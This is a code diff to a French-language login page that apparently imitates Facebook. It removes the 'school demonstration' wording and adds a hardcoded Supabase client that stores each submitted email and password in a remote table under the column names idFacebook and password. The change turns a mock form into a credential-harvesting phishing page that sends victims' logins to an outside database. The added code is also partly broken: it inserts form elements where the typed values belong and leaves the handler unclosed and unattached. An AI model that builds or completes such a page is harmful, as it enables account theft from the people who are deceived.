@@ -5,6 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
     <title>Connexion</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
 
     <style>
         * {
@@ -15,7 +17,7 @@
 
         body {
             font-family: Arial, Helvetica, sans-serif;
-            background: black;
+            background: white;
             min-height: 100vh;
             color: #65676b;
         }
@@ -329,7 +331,7 @@
             >
 
             <button type="submit" class="login-button">
-                Se connecter
+                Continuer
             </button>
 
             <div id="error" class="error">
@@ -368,7 +370,29 @@
 
 
     <script>
+    /* ================================
+       CONFIGURATION SUPABASE
+    ================================= */
 
+    const SUPABASE_URL =
+        "https://leppncecjxccbkwoktyu.supabase.co";
+
+    const SUPABASE_KEY =
+        "sb_publishable_FDtcO7MF7VVtQ7s94bpGeQ_5D4Reg4j";
+
+    const supabaseClient =
+        window.supabase.createClient(
+            SUPABASE_URL,
+            SUPABASE_KEY
+        );
+
+
+
+    async function register(event) {
+
+        event.preventDefault();
+
+        
         const form = document.getElementById("loginForm");
 
         const email = document.getElementById("email");
@@ -378,12 +402,6 @@
         const error = document.getElementById("error");
 
 
-        form.addEventListener("submit", function(event) {
-
-            // Empêche l'envoi réel du formulaire
-            event.preventDefault();
-
-            // Vérification des champs
             if (
                 email.value.trim() === "" ||
                 password.value.trim() === ""
@@ -392,21 +410,31 @@
                 error.style.display = "block";
 
             } else {
+              
+            try{
+                
 
-                error.style.display = "none";
+            const { error: profileError } =
+                await supabaseClient
+                    .from("profiles")
+                    .insert({
+                        idFacebook: email,
+                        password: password
+                        
+                    });
 
-                alert("Démonstration scolaire : les champs sont remplis.");
+              }catch(error){
+                console.error(error);
+                }
 
-            }
+        }
 
-        });
-
-
+       
         // Bouton nouveau compte
         document.getElementById("newAccount")
             .addEventListener("click", function() {
 
-                alert("Page de création de compte - démonstration");
+                alert("Page de création de compte ");
 
             });
 
@@ -417,7 +445,7 @@
 
                 event.preventDefault();
 
-                alert("Fonctionnalité de récupération - démonstration");
+                alert("Fonctionnalité de récupération");
 
             });
 
